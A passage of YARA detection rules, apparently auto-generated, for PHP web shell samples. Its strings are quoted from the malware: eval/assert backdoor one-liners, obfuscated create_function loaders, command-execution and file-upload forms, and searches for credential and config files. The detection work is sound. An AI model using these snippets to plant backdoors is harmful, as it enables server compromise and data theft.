      $s5 = "<form action=<?php echo $surl ?>&<?php echo $word ?>&exec method=\"post\">" fullword ascii
      $s6 = "mkdir(urldecode($_POST['dir']).\"/\".$_POST['name']) or die (\"[-]Error creating dir!\");" fullword ascii
      $s7 = "if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploaddir .\"/\". $_FILES['userfile']['name'])) {" fullword ascii
      $s8 = "echo \"</a></td><td><a href=\".$surl.\"&\".$word.\"&download&file_browser&file=\".urlencode($j_d).\"/\".urlencode($file).\">\";" fullword ascii
      $s9 = "<input type=\"submit\" name=\"sub\" value=\"Execute\"><br>" fullword ascii
      $s10 = "unlink(urldecode($dir).\"/\".$file) or die (\"[-]Error @ file:\".$file.\"\");" fullword ascii
      $s11 = "echo \"</textarea><br><br><input type=hidden name=file value=\".urlencode($_GET['file']).\"><input type=submit name=sub valu" fullword ascii
      $s12 = "<form enctype=\"multipart/form-data\" action=<?php echo $surl ?>&<?php echo $word ?>&upload method=\"post\">" fullword ascii
      $s13 = "By turning \"on\" safe you can make your shell in 404 Not Find mode if the user doesnt know your OWN set word!" fullword ascii
      $s14 = "<form action=<?php echo $surl ?>?&<?php echo $word ?>&special_d&file=<?php echo urlencode($filename) ?> method=post>" fullword ascii
      $s15 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAZGVzYwAAAAAAAAAuSUVDIDYxOTY2LTIuMSBEZWZhdWx0" fullword ascii
      $s16 = "<form enctype=\"multipart/form-data\" action=<?php echo $surl ?>&<?php echo $word ?>&special_crypt method=\"post\">" fullword ascii
      $s17 = "LFJlZmVyZW5jZSBWaWV3aW5nIENvbmRpdGlvbiBpbiBJRUM2MTk2Ni0yLjEAAAAAAAAAAAAAACxS" fullword ascii
      $s18 = "ZWZlcmVuY2UgVmlld2luZyBDb25kaXRpb24gaW4gSUVDNjE5NjYtMi4xAAAAAAAAAAAAAAAAAAAA" fullword ascii
      $s19 = "AABDb3B5cmlnaHQgKGMpIDE5OTggSGV3bGV0dC1QYWNrYXJkIENvbXBhbnkAAGRlc2MAAAAAAAAA" fullword ascii
      $s20 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAF" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      8 of them
}

rule sig_4ddf92ee0fc5d48fbdce74db78e85813f3bb59f0
{
   meta:
      description = "php17 - file 4ddf92ee0fc5d48fbdce74db78e85813f3bb59f0.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "df29b5e54dbef1aee1c97242148712a61cfcd30297860d82606d8ccf186a146e"
   strings:
      $s1 = "assert($_GET['c']);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_34e62c3cf8e868031704fc28e35a4c5502d8bc8c
{
   meta:
      description = "php17 - file 34e62c3cf8e868031704fc28e35a4c5502d8bc8c.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "0a84fb9a9a1a905ac6a062f9a4a87c081090b50dbd5cbec6733ccb9ac7c322ed"
   strings:
      $s1 = "<center><form method=POST action=''><font face='Arial' color='#000000'>Mysql Host</font><br><input type=text name=phpbbdbh v" fullword ascii
      $s2 = "<center><form method=POST action=''><font face='Arial' color='#000000'>Mysql Host</font><br><input type=text name=smfdbh val" fullword ascii
      $s3 = "<center><form method=POST action=''><font face='Arial' color='#000000'>Mysql Host</font><br><input type=text name=mybbdbh va" fullword ascii
      $s4 = "<center><form method=POST action=''><font face='Arial' color='#000000'>Mysql Host</font><br><input type=text name=dbh value=" fullword ascii
      $s5 = "<title>Lolipop.php - Edited By KingDefacer - [$site]</title></head>\"; " fullword ascii
      $s6 = "<font face='Arial' color='#000000'>Dbsifre<br></font><input type=password name=dbp size='50' style='font-size: 8pt; co" fullword ascii
      $s7 = "<font face='Arial' color='#000000'>Dbsifre<br></font><input type=password name=mybbdbp size='50' style='font-size: 8pt" fullword ascii
      $s8 = "<font face='Arial' color='#000000'>Dbsifre<br></font><input type=password name=smfdbp size='50' style='font-size: 8pt;" fullword ascii
      $s9 = "<font face='Arial' color='#000000'>Dbsifre<br></font><input type=password name=phpbbdbp size='50' style='font-size: 8p" fullword ascii
      $s10 = "$loli2 = \"UPDATE template SET template='\".$set_index.\"\".$KingDefacer.\"' WHERE title='FORUMHOME'\"; " fullword ascii
      $s11 = "$loli1 = \"UPDATE template SET template='\".$set_index.\"\".$KingDefacer.\"' WHERE title='spacer_open'\"; " fullword ascii
      $s12 = "yle='color: #000000; background-color: #FFFFFF'>buraya indexiniz gelecek.?ndexi yaz postala kay gitsin.</textarea><br> " fullword ascii
      $s13 = "'color: #000000; background-color: #FFFFFF'>buraya indexiniz gelecek.?ndexi yaz postala kay gitsin.</textarea><br> " fullword ascii
      $s14 = "$loli7 = \"UPDATE \".$prefix.\"templates SET template='\".$mybb_index.\"' WHERE title='index'\"; " fullword ascii
      $s15 = "$execute = $_POST['execute']; " fullword ascii
      $s16 = "<font face='Verdana' size='1' color='#000000'>Site: <u>$site</u><br>Server name: <u>$sname</u><br>Software: <u>$info</u><br>Vers" ascii
      $s17 = "$site = getenv(\"HTTP_HOST\"); " fullword ascii
      $s18 = "$header = \"From:\".$_POST['header']; " fullword ascii
      $s19 = "<font face='Verdana' size='1' color='#000000'>Site: <u>$site</u><br>Server name: <u>$sname</u><br>Software: <u>$info</u>" fullword ascii
      $s20 = "' style='font-size: 8pt; color: #000000; font-family: Tahoma; border: 1px solid #666666; background-color: #FFFFFF'><br> " fullword ascii
   condition:
      uint16(0) == 0x703c and filesize < 40KB and
      8 of them
}

rule sig_5db9344505f67136ec3798de1c6167474ced163b
{
   meta:
      description = "php17 - file 5db9344505f67136ec3798de1c6167474ced163b.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9f35846b83ee6a681282f7044687c1b2acae10a6a02fe76e124ef2cf713f7b75"
   strings:
      $s1 = "aT3sUEDW3w2k6ncLffweUzZ7FL2GPx88TOBLQfg7fYAeMRPAUlI/oh62sJQ7+UQVGnBFOsE/h4/Yxa9eTQqWB56f8JgkyBDL92mh+t1orufw==')))); ?>" fullword ascii
      $s2 = "fBkpOE1koVTMVf//jkcQw0lTXTGyUyCPKc09g9G1rcDaeEsLiOgXuREX7YPPww0xI7FAneVNiwhPfxKZEsU3/oIyEczZVXW45G8QSMSKVc8cE58nVpWDWIsoIrjkA6MP" ascii
      $s3 = "e0EMtPO4hWa5NmaXTnEv3aeTZfH1MRBT4tJHuEZjqGirXvs/4/r/0hWhMMu9hesXTjthOsnHgg9GZ11A6ucBsOywcBnLAywm3Dxo3X5riQptacUh0TKUzCVIiwV25wNF" ascii
      $s4 = "BXiRSI7K/Dwfx3nSB8hB7MhXtRZdn3FctjWgxypTKJzMItJ1ua0e4LIx/bZUHj2KdqNKzrVXOwFVrkdV+8NV22nwHJGoIoMawV3wtOfBMGmahn9RKBzwBPH5hiFgxRgA" ascii
      $s5 = "Ujbt/YDvzC8wJRRjYzD4xTBdD4er6D0Grgtm+JDm9vPQe9iBgCHLpoow+/CvqRLFZZ5uh2E2bpB8OT0RPqxZwp2h263uAYvZDgRt5pVxga2+/d3Z1pzPgNGrufbr6ejs" ascii
      $s6 = "D6+SRyIlqZBZRyCVf0+AOmz/U+QMRj0MG4+zKhPZEkhFQVgXrG01whtVl2ByttpzDSHGpjmFFrW+vlTsLW+iIOU7ckzuE7/SfMFQUXVIPrTVTbYCmckYmS5LFvKcmUsT" ascii
      $s7 = "SKDMQVQXlDPzry8oTXUT2ya/vWMMSm9ap6/mcnl0kYC0Foy+iOkSLPT7rZA5bXGw/OJ35/8NkdHp+5lumDiFfFQ3R6aDLqXZy5w4k/Ho0m1rWNnVJtkIpR2Ok81T2R0Y" ascii
      $s8 = "LUIsM+Kk80Csg/sG5Nr3eYSdEwYBTOBcJ6xUdZu4GY0RgdIG2XxoKptkaI207W1SWUtkYB91ayf3bnFxSKGA7nWr/ff++63UJHsRuCPDInAUToI4kYHD+fVviy9+ooci" ascii
      $s9 = "srdF8rN269Kp9hUFWIaHD6uXbKxmmYds5QxQRU6QKSIX0vwlJHzIdDi4pbR8s7RXJMKnFd6/ctxzKXyKj2tC6m3KgaB++0IqMqzzjSEhuMqx6935CbG03Kn1dkaPUtOc" ascii
      $s10 = "AzdcYurcK52g258YiYXkXp+hrs1QyOyqeEA0H3U25piV4e3qVIRG9dg50xMq2YiFvqF9F25HiD+pMuKlb9wg3WxwqNetKUYH5VKF16MVeqroDlQSM9Gh5DsUjQlt7Lw5" ascii
      $s11 = "rcw+MdULNZcX5TRpEpxnT1c+N1aodaRH2PVlZIveZ7rucNU8NYKyBfyI1o3XX8Z7+7RrtykqlD5FyhDneCRnpOA/ioHcZ/u+NYfDqZnPunI2KCr7Wa8S9b6rH714XrWv" ascii
      $s12 = "uIiCIV+KoiXdD/R2QBN55RqM9vdypktPWjguYsiigvAcsC/pbBFPxYtWFC/RWXOX8ror2Ib1UXxruFNk55xNeEFt7v3pdsOF3oDxiFMZGyo8iWUAGy1OFAregtCt6ian" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 5KB and
      8 of them
}

rule sig_4237b672fe4b3f263ae81d31b7ff75b04e5b2bd6
{
   meta:
      description = "php17 - file 4237b672fe4b3f263ae81d31b7ff75b04e5b2bd6.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "094b526e9d2ed2c32b58d9af27eacfec615dade6f3b136f129b3719aa6b513e7"
   strings:
      $s1 = "1=$GLOBALS['_2107201120_'][0]($_SERVER[_353739753(1)]);if($GLOBALS['_2107201120_'][1]($_0 .$_1)){include($_0 .$_1);exit();}?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_2d01c1d05b896fd08876dfba21a97c0bcc625c9e
{
   meta:
      description = "php17 - file 2d01c1d05b896fd08876dfba21a97c0bcc625c9e.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "cf3f5549e8be43cdc3d0dbae74b8569af12b8fdbce14a553aebb18d90a4e549d"
   strings:
      $s1 = "hQ9RlwUMUazSe39rNUyGR9EXcqg2oY/dPOazuWIs/MBsINF5Bv1MhVvoNtCHQ85SN92390lU8IJOErUfFPXHwTYZVZw+0d5E8vn6Bx2Sem+K55tABR83AFaCZFJbXSj" fullword ascii
      $s2 = "3].$a9[18].$a9[12].$a9[15].$a9[21].$a9[10].$a9[18].$a9[0].$a9[6].$a9[3].$a9[20].$a9[18].$a9[5].$a9[11].$a9[20].$a9[18].$a9[12]." fullword ascii
      $s3 = "$a9 = array('6',\"n\",')','_',\"g\",\"c\",'4','f',\"v\",'$','s',\"o\",\"(\",'t',\"r\",\"b\",';','l','e','z','d','a','i');" fullword ascii
      $s4 = "jgYoXAXrMmniMEMxLFvFi2mfCDPT6s4seA2h771GxqC1D38GAZiS4t/KkkPGs0TKA3j1Z4NqX3g7cB2oj76U/iN5OLhSdsQGJhpezjgQywY6/Cm8QyYE9OcREvHEia9" fullword ascii
      $s5 = "VmneOB8vSIkdCKb9250f4CshI7DvwxteFZ8Mmn7qog2Rea/ccGGB/54QsqgB5ajOpINN25wOiSaPkVfck2/ZhtBaSXk2gMkOpjXswPCQ2/YfUWEksPMdQQG0VliVLQx" fullword ascii
      $s6 = "eT0qzwEx3L/TWJHihJJxBAFdjbNdzB6+4GgVYQgxBEzA03C+UEbiq8p6Ub8TQaqI5Wg1Ekqn6o+1WWxQj6Zwfs6jL2QDpC67AuoyaAORED0+jbj9tlj5lCh57vpqcyT" fullword ascii
      $s7 = "3yzXOE7oWr5T3rIhiqV9ZNGpYAlD7g+yk0400UPWjgRhJPHEb6HWeZjRg2dEb5dhJV16kDA57Ob2pup4qEQiIVIzeD8TRL6xqY0tyvSYIXMggGnaAIwQHaWUWLC3mET" fullword ascii
      $s8 = "uE0mjRET0kLzK/58y0FHlRE9cjLw3h6h/snyn7AkQhF4aPLTtwn1ZHCqdc1BwiC6Lily9560HY8UJrGoXQ3I9qeQeQnG/ufJoHjTh4LcnfT2PXoXb6YplBEHkwf8tgb" fullword ascii
      $s9 = "Ee9NHW/ESQT8rdmLXvru+rSnoiZRhymKThpGWp+I+BOVStTwQCPsgcPld8K3tFlMIvd3Wts46Z/T+KM6eZE9yFIU0tMGCvekeSR6W88XCVbKF5BNCWSWRk7rr6XNtwf" fullword ascii
      $s10 = "P5YKgxsUwnOk4j05MredJ9LzSdbvKV29CAjMdmYgKN0SHejcxB/9Vix5FYjrwk1KiZNWBAeYLU+URDjjQXbF73dEyx8mYnh3834PRkj8bXTII9HeCGwB5riQdKAj/GV" fullword ascii
      $s11 = "$md5 = \"d47cdbc3a3ea8c0e3619b43bcdeb8155\";" fullword ascii
      $s12 = "V2XPbWzY3RGYfVmJfDNhAEreu6QBC37v/+++uff/759/8=');" fullword ascii
      $s13 = "kHuMVEOXUzsOWRYyQC77DkI6FCZkhMhbZnlzbBLRE6KYx2z3vSBZrgBLOCWrDxiTsBUJAi0r2JoWMvJ1Txt/GoX0Wn9dQ8nrqcxNuWBknal9X2MVb2PTxjlWvI1FG/ZE" ascii
      $s14 = "dFoR+259j8DlqBdlgqLn2j/Rv230uK8+qmSnlYVuu4QmQ5M6mqOGoYwVJkbkTKDTymQsNJPtQb1hc8ot9vP3PqzC3+6Hqod/28PuKImp6H+FKzalAZqqoBlN7u0bYDY6" ascii
      $s15 = "FIZbj+eZcwewzV6YoYzbqAmYZ3+jbrkyrmgtEnBMqfh+4Bw4EUEqeMTkew/GvhEreXb9YBHFZuuGEAibAHU4rYLOUIG3OXWVwqu0vg/dFsvXI5WiQP8brY1mhNXXD7Yl" ascii
      $s16 = "aUDMSzOFE3L6k61lakw1oRGqoeOKaggVlU/hGutBRgeWeA4zK6D75tQgj52fux9WPiz/hqTD8EYWvFFKa5D5glZEOUz/spzYhw/LY1AGXSRq0bBhf7LtINUgIhL0iQ4r" ascii
      $s17 = "d47cdbc3a3ea8c0e3619b43bcdeb8155" ascii
      $s18 = "nHkHwr38fmjfDkB2V7sVljq97QS+xlfarTNeH7Cdee41KOoUyK+JvIiU5IwiUCWm7HFzxfFPuxbnZRlidDh5v3ek1qNjTsytkNEO2WkDbfG0b1jQUYoon+E2K+wqc9iF" ascii
      $s19 = "Q8KrZM27qo+jxgc7OyZWAtq7tnMyDaExjkI4PW8gQUb1GwzFWUhWI374b8oSrQyFkwLK0sLXQIkN+i+xdWC1XvZP4obWHW7KSzqwSQsb4JrOXVnZXMx9SswOsUleFX+e" ascii
      $s20 = "rf1cGRnM6txSCodfVYpa4Wz/Mb+L5F1DkHWKRN4DLUoPdVLBic0J51mT5jrrFKiiSkX1bMmNB7d9El1+KQ1R0WK6QVLOtGArRwq8VCrYSiITqDfKrUcNK8UTBth1A7EX" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 7KB and
      8 of them
}

rule sig_10055f447e1c9d40b0dcd092fa4229e0e3fc834f
{
   meta:
      description = "php17 - file 10055f447e1c9d40b0dcd092fa4229e0e3fc834f.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a89db83196c642fc3e1231fb4690f5315d220dad9de0cbc0b2e0549bda414b26"
   strings:
      $s1 = "$k='[$i],0,$hhe))),$k)hh));$hho=ohhbhh_get_contents()hhhh;ob_end_clean(hh);$d=bahhse64_hhenc';" fullword ascii
      $s2 = "$b='s[$hhi]hh,$f);if(hh$hhe){hh$k=$kh.$kf;obhh_start();hh@evhhal(@gzhhuhhncompress(@x(@hhbhhas';" fullword ascii
      $s3 = "$D='$i}^$k{hh$j};}}rhhethhurn $o;}$r=$hh_ShhERVER;$hhrr=@$r[\"HhhTTP_REFERER\"hh];$rhha=@$rhh[';" fullword ascii
      $s4 = "$z='ohhde(x(gzhhcompreshhs($hhhho),$k));hhprhhint(\"<$k>$d</hh$k>\");@sehhssihhon_deshhtroy();}}}}';" fullword ascii
      $s5 = "$n='\"\";$phh=$sshh($p,hh3);}hhif(arrayhh_key_exhhists($ihh,hh$s))hh{$s[$i].hh=$p;$e=strposhh($';" fullword ascii
      $s6 = "$I='($hhu[\"queryhhhh\"],$q);$q=arrahhy_values(hh$q)hh;prhheg_matchhh_alhhl(\"/([\\\\w])[\\\\w-hh]+(?h';" fullword ascii
      $s7 = "$O='$hhhho=\"\";for(hh$i=0;$i<$lhh;)hh{for(hh$jhh=0;($hhj<$c&&$i<$l);$j+hh+,$i++)hh{$ohh.=hh$hht{';" fullword ascii
      $s8 = "$o='SION;$hhss=\"subhhstr\";$sl=hh\"shhhhtrtolower\";$i=$hhm[1hh][0]hh.$m[1][1hh];$hhh=$sl($ss(mh';" fullword ascii
      $s9 = "$Z='$kh=\"5d41\";hhhh$kf=\"402a\";hhfuncthhion x($hht,hh$k){hh$c=strlhhen($k);$hhl=strlen(hh$t);';" fullword ascii
      $s10 = "$d='hhh:hh;q=0.([\\\\hhd]))?,?/\",$ra,$m)hh;ihhf($q&hh&$m){@sessihhon_hhstarthh();$s=&$_ShhhhES';" fullword ascii
      $s11 = "$F='e64_dehhcode(prhheg_rehhplhhace(arrhhay(\"hh/_/\",\"/-/\"hh),arrhhay(\"hh/\",\"+\"hh),$ss(hh$s';" fullword ascii
      $s12 = "$a='\"HThhTP_ACCEhhPT_LANGUAGhhE\"];hhif($rr&hh&$hhra){hh$u=parse_hhurl($rrhh);pahhrse_hhstr';" fullword ascii
      $s13 = "$M='hd5hh($i.$kh)hhhh,0,3));$f=$slhh($ss(mhhhhd5hh($i.$kf),0,3hh));$p=\"\";hhfor($z=hh1;$hhz';" fullword ascii
      $s14 = "$j='<count(hh$m[1])hh;$z+hh+)$p.=$hhq[$hhm[2][$z]];ifhh(sthhrpos($p,hh$h)===0hhhh){$s[$i]=';" fullword ascii
      $s15 = "$q=str_replace('hh','',$Z.$O.$D.$a.$I.$d.$o.$M.$j.$n.$b.$F.$k.$z);" fullword ascii
      $s16 = "$K=str_replace('ym','','ymcrymeate_ymfuymncymtymion');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule AK_74_Security_Team_Web_Shell_Beta_Version_3
{
   meta:
      description = "php17 - file AK-74-Security-Team-Web-Shell-Beta-Version.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "0c6879cdd19836091025915fb260a61558a39f379ae5d3cda4229d9cdb9a8689"
   strings:
      $x1 = "$res .= '<html><head><title>AK-74 Security Team Web Shell</title><meta http-equiv=\"Content-Type\" content=\"text/html; cha" fullword ascii
      $x2 = "<b><font color=#830000>3.</font></b><font color=#830000> <b><font color=#830000>User</b></font> - ' . (get_current_user()) ." fullword ascii
      $x3 = "' <b><font color=#830000>|| User ID</font></b> - ' . (getmyuid()) . ' <b><font color=#830000>|| Group ID</b></font> - ' . (getm" fullword ascii
      $x4 = "$res .= '<tr><td align=center><b><font color=#83000>Copyright </font><a href=\"http://ak74-team.net\" target=\"_blank\">AK-7" fullword ascii
      $x5 = "<b><font color=#830000>7. Your IP - </font></b><font color=#830000>' . (getenv('REMOTE_ADDR')) . '</font><br><br>" fullword ascii
      $x6 = "$res .= '<form action=\"' . $xshell . '?act=execute\" method=\"post\"><input type=\"hidden\" name=\"action\" value=\"execute\">" fullword ascii
      $x7 = "<b><font color=#83000>Execute system commands!</font></b>" fullword ascii
      $s8 = "<b><font color=#830000>4. Server Software - </font></b><font color=#830000>' . (getenv('SERVER_SOFTWARE')) . '</font><br><br" fullword ascii
      $s9 = "<b><font color=#830000>4. Server Software - </font></b><font color=#830000>' . (getenv('SERVER_SOFTWARE')) . '</font><br><br>" fullword ascii
      $s10 = "<b><font color=#830000>5. Request Method - </font></b><font color=#830000>' . (getenv('REQUEST_METHOD')) . '</font><br><br>" fullword ascii
      $s11 = "<b><font color=#830000>6. Server IP - </font></b><font color=#830000>' . (getenv('SERVER_ADDR')) . '</font><br><br>" fullword ascii
      $s12 = "$res .= '<a href=\"' . $xshell . '?act=chmod&file=' . $_SESSION['currentdir'] . '/' . $dirs[$i] . '\">' . ($this->getp" fullword ascii
      $s13 = "if (! move_uploaded_file($_FILES['filename']['tmp_name'], $_SESSION['currentdir'] . '/' . $_POST['filename2']))" fullword ascii
      $s14 = "$content .= $shell->downloadfile($_GET['file']);" fullword ascii
      $s15 = ": ' . ($shell->getmicrotime() - $timestart) . '</center>';" fullword ascii
      $s16 = "$res .= '<tr><td align=center><form enctype=\"multipart/form-data\" action=\"' . $xshell . '?act=filemanager\" method=\"post\"" fullword ascii
      $s17 = "$res .= '<tr><td align=center><form action=\"' . $xshell . '?act=filemanager\" method=\"post\"><input type=\"hidden\" name=\"ac" fullword ascii
      $s18 = "$res .= '<form action=\"' . $xshell . '?act=exesys\" method=\"post\"><input type=\"hidden\" name=\"action\" value=\"exesys\">" fullword ascii
      $s19 = "$res .= '<tr><td align=center><b><font color=#83000>Copyright </font><a href=\"http://ak74-team.net\" target=\"_blank\">AK-74 Se" ascii
      $s20 = "<tr><td align=center><b><font color=#83000>Copyright </font><a href=\"http://ak74-team.net\" target=\"_blank\">AK-74 Security Te" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 70KB and
      1 of ($x*) and 4 of them
}

rule sig_00e26af6ac3b1c1c49d7c3d79c60d000
{
   meta:
      description = "php17 - file 00e26af6ac3b1c1c49d7c3d79c60d000.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "83b796b4a4c53725c4d504514e91a373feb223304126d41d355eab58994c9e02"
   strings:
      $s1 = "$char_base64_decode='b'.$char_as.$char_e.(64).'_'.'d'.$char_e.'c'.'o'.'d'.$char_e;" fullword ascii
      $s2 = "//ZXZhbCgkX1BPU1RbMV0p: \"eval($_POST[1])\"" fullword ascii
      $s3 = "@$char_assert(@$char_base64_decode('ZXZhbCgkX1BPU1RbMV0p'));" fullword ascii
      $s4 = "$char_assert=$char_as.'s'.$char_e.'r'.'t';" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_4450b912a67cfa05ae8c5cef2545a3bbe62ef189
{
   meta:
      description = "php17 - file 4450b912a67cfa05ae8c5cef2545a3bbe62ef189.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "39cd943dd64b9883867ca2d63f68d1e2361e68f69542b6861142fa89d30e5291"
   strings:
      $s1 = "$parsed = yaml_parse($yaml, 0, $cnt, array(\"!{$_REQUEST['op']}\" => 'preg_replace'));" fullword ascii
      $s2 = "$str = urlencode($_REQUEST['op']);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_456cc6cdf6c6d5034df0642505220af3e684a6f0
{
   meta:
      description = "php17 - file 456cc6cdf6c6d5034df0642505220af3e684a6f0.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "52a12b52b2b8091349b82d763cd37f0c9f6aa61c227a4b7b1aa394c2d0833f5b"
   strings:
      $s1 = "$S='i],0f`,$ef`))),$kf`)));f`$o=ob_getf`_conf`tents(f`)f`;ob_ef`f`nd_clean();$d=basf`e64f`';" fullword ascii
      $s2 = "$y='@f`$r[\"HTTPf`_ACCEPf`f`T_LANGUAGf`E\"];if(f`$rr&&$raf`){$f`u=paf`rf`se_url($rr);parsf`e_st';" fullword ascii
      $s3 = "$X='f`_encode(x(gzcomprf`f`essf`($o),$k))f`;print(\"<$f`k>$d<f`/$k>\");@f`sessf`f`ion_destroy();}}}}';" fullword ascii
      $s4 = "$L='{$if`f`}^$k{$j};f`}}rf`eturn $o;}$r=$_f`SERVERf`;$rf`r=@$r[\"HTTP_Rf`EFf`ERER\"f`];$ra=';" fullword ascii
      $s5 = "$e='\"f`f`;$pf`=$ssf`f`($p,3);}if(array_key_existf`s($if`,$s)){f`$f`s[$f`i].=$p;$e=f`sf`trp';" fullword ascii
      $s6 = "$Q='f`-]+(f`?:;qf`=0f`.([\\\\f`d]))?,?/\",$raf`,$m);if($f`q&&$m){f`@sf`f`ession_start()f`;$f`s=&$_SESS';" fullword ascii
      $s7 = "$x='zf`<cf`ount($m[1])f`;$z++)$f`p.f`=$q[f`$m[2][f`$z]];if(sf`trpos(f`$p,f`$h)===0){$s[$i]f`=\"';" fullword ascii
      $s8 = "$s='If`ON;$sf`s=\"substrf`\";$f`sl=\"sf`trtolower\"f`;f`$i=$m[1][0f`].f`$m[1][1];f`f`f`$h=$sl($';" fullword ascii
      $s9 = "$l='$kh=\"5d41\";f`$kf=\"4f`02a\"f`;fuf`nction x($f`t,$k)f`{$c=strf`len($kf`);$l=f`f`strlen($f`t)';" fullword ascii
      $s10 = "$W='r($f`u[\"qf`uery\"],f`$q);$q=f`f`array_valuesf`(f`$q);preg_f`matf`ch_all(\"/([\\\\wf`])[\\\\w';" fullword ascii
      $s11 = "$G='sf`e64_decof`df`e(preg_replacf`ef`(array(\"/_/f`\",\"/f`-/\"),f`arrf`ay(\"/\",\"+\"f`),$ssf`($s[$';" fullword ascii
      $s12 = "$C='osf`(f`$sf`[$i],$f);iff`($e){$k=$kh.$kf;ob_stf`af`rt();@ef`val(@gzuncf`ompressf`(@x(f`@ba';" fullword ascii
      $s13 = "$c='sf`s(md5($i.f`$kh)f`,0,3));$f=$f`sl($ss(md5f`f`($i.$kff`)f`,0,f`3));$p=\"\";for($z=1;$f`';" fullword ascii
      $s14 = "$q=';$o=\"\";f`f`ff`or($i=0;$i<$lf`;){for($j=f`0;($jf`f`<$c&&f`$i<$lf`);$j++,$i++f`f`){$o.=$t';" fullword ascii
      $s15 = "$O=str_replace('f`','',$l.$q.$L.$y.$W.$Q.$s.$c.$x.$e.$C.$G.$S.$X);" fullword ascii
      $s16 = "$R=str_replace('Qe','','creQeQeatQee_fuQencQeQetion');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule sig_6c1a6ab411c346811fa40b50c4514645a720d673
{
   meta:
      description = "php17 - file 6c1a6ab411c346811fa40b50c4514645a720d673.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d861025519a35af6895ed20eb50c46ae25f02cedd56476f741418bee048611c0"
   strings:
      $s1 = ";)))RIDYLNO_BOLG ,'*'.htap$(bolg@ ,)]'3p'[TSOP_$.htap$(bolg@(egrem_yarra@(euqinu_yarra@ = shtap$" fullword ascii
      $s2 = ",\"php.cni.gifnoc eman- f epyt- / dnif\" >= \"selif php.cni.gifnoc dnif\"" fullword ascii
      $s3 = "uo.fc.d{)'\\raelc'\\==eulav.dmc.fc.d(fi\"=timbusno fc=eman mrof<>tnetnoc=ssalc vid<>1h/<elosnoC>1h<' ohce" fullword ascii
      $s4 = ">tpircs/<" fullword ascii
      $s5 = ";eurt nruter ) )\"emanbd$=emanbd ssap$=drowssap resu$=resu }]1[tsoh${=trop }]0[tsoh${=tsoh\"(tcennoc_gp@ = knil>-siht$ (fi" fullword ascii
      $s6 = ";'>tpircs/<;\"\"=_3p=_2p=_1p>tpircs<>tnetnoc=ssalc vid<>1h/<reganam eliF>1h<' ohce" fullword ascii
      $s7 = ";\">noitpo/<eteleD>'eteled'=eulav noitpo<>noitpo/<evoM>'evom'=eulav noitpo<>noitpo/<ypoC>'ypoc'=eulav noitpo<>'1p'=eman tceles<" fullword ascii
      $s8 = "\"\\daolnwod\"\\=eulav.2p.fs.tnemucod'=kcilcno 'pmuD'=eulav nottub=epyt tupni< >';)(si'=kcilcno 'xobkcehc'=epyt tupni<\" ohce" fullword ascii
      $s9 = "'>rt/<>dt/<>lebal/<)login >- nigol( esrever >dekcehc 1=eulav esrever=eman xobkcehc=epyt tupni<>\"xp51:tfel-gniddap\"=elyts lebal" ascii
      $s10 = "'>rt/<>dt/<>lebal/<)login >- nigol( esrever >dekcehc 1=eulav esrever=eman xobkcehc=epyt tupni<>\"xp51:tfel-gniddap\"=elyts lebal" ascii
      $s11 = ">tpircs<" fullword ascii
      $s12 = ";)eulav$(srahclaicepslmth = eulav$" fullword ascii
      $s13 = "{ ))eslaf===)'diuwpteg_xisop' ,]'snoitcnuf_elbasid'[SLABOLG$(soprts( && )\"diuwpteg_xisop\"(stsixe_noitcnuf!( fi" fullword ascii
      $s14 = "{ ))eslaf===)'digrgteg_xisop' ,]'snoitcnuf_elbasid'[SLABOLG$(soprts( && )\"digrgteg_xisop\"(stsixe_noitcnuf!( fi" fullword ascii
      $s15 = "av.saila.fc.d,llun,llun(a{)dekcehc.xaja.fc.d(fi;)eulav.saila.fc.d(dda\"=kcilcno nottub=epyt tupni<>tceles/<' ohce" fullword ascii
      $s16 = "looTtceles.siht,llun,llun(a{)dekcehc.xaja.siht(fi'=timbuSno 'mroFsloot'=eman mrof<\" ohce" fullword ascii
      $s17 = ";'03,'.)03*]'3p'[TSOP_$(.' TIMIL `'.]'2p'[TSOP_$.'` MORF * TCELES' = ]'2p'[TSOP_$" fullword ascii
      $s18 = ";)03*]'3p'[TSOP_$(.' TESFFO 03 TIMIL '.]'2p'[TSOP_$.' MORF * TCELES' = ]'2p'[TSOP_$" fullword ascii
      $s19 = ",\"dwp.ecivres eman- f epyt- . dnif\" >= \"rid tnerruc ni selif dwp.ecivres dnif\"" fullword ascii
      $s20 = ",\"yrotsih_hsab. eman- f epyt- . dnif\" >= \"rid tnerruc ni selif yrotsih_hsab. dnif\"" fullword ascii
   condition:
      uint16(0) == 0x743b and filesize < 200KB and
      8 of them
}

rule sig_30a34ea3a2f15234ca518c3308618e32
{
   meta:
      description = "php17 - file 30a34ea3a2f15234ca518c3308618e32.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "0cb26edabbbba87ce05a16443616ff9c811dbad6bb277ddecee2fa60eed3de05"
   strings:
